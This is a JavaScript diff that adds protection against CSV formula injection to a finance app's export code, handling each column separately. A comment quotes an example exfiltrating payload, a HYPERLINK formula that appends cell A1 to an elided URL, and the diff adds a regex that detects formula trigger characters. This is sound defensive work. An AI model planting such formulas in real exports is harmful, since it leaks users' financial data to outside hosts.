@@ -45,6 +45,36 @@ function csvField(v) {
   return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
+// ── Spreadsheet formula injection ──────────────────────────────────────────
+// A CSV is the one export here that a double-click opens in Excel or LibreOffice,
+// and those treat a cell beginning = + - @ (or a tab / carriage return) as a
+// formula rather than as text. A description reading
+// =HYPERLINK("http://…"&A1,"Receipt") then runs on open, and descriptions are
+// not typed by the user: they arrive from an imported bank file, so a crafted
+// statement plants the payload and the export carries it out of the app.
+//
+// The fix is the standard one, a leading apostrophe, which spreadsheets consume
+// as "the rest is text". Two things it must NOT do:
+//
+//   1. Touch the amount or date columns. Amounts are signed, so a leading '-'
+//      is ordinary there, and prefixing it would break every importer that
+//      reads the file back. Hence a separate helper for text columns rather
+//      than folding this into csvField.
+//   2. Be irreversible. This app imports its own exports, so txparse.js undoes
+//      exactly this on read (unescapeCsvFormula) — it strips ONE leading
+//      apostrophe and only when a trigger character follows, so a description
+//      that genuinely starts with an apostrophe round-trips untouched.
+//
+// Only CSV. QIF and the OFX family are read by finance software rather than
+// spreadsheets, and neither opens as a grid, so the same prefix there would be
+// corruption without a corresponding risk.
+const CSV_FORMULA_LEAD = /^[=+\-@\t\r]/;
+
+function csvText(v) {
+  const s = String(v ?? '');
+  return csvField(CSV_FORMULA_LEAD.test(s) ? `'${s}` : s);
+}
+
 // OFX SGML uses XML entities for markup characters in values; the import
 // parser (txfileimport.js unescapeXml) reverses exactly this set.
 function escapeXml(s) {
@@ -56,10 +86,18 @@ function escapeXml(s) {
 
 const csv = {
   header: () => 'Date,Description,Type,Category,Amount,Notes' + CRLF,
-  row: (t) =>
-    [t.date, t.description, t.tx_type, t.category_name || '', signedAmount(t), t.notes || '']
-      .map(csvField)
-      .join(',') + CRLF,
+  // Per column, not one map over the row: date and amount go through csvField
+  // (quoting only), the free-text columns through csvText (quoting plus the
+  // formula guard above). tx_type is one of three fixed words and category
+  // names are user-typed, so both take the text path.
+  row: (t) => [
+    csvField(t.date),
+    csvText(t.description),
+    csvText(t.tx_type),
+    csvText(t.category_name || ''),
+    csvField(signedAmount(t)),
+    csvText(t.notes || ''),
+  ].join(',') + CRLF,
   footer: () => '',
 };
 
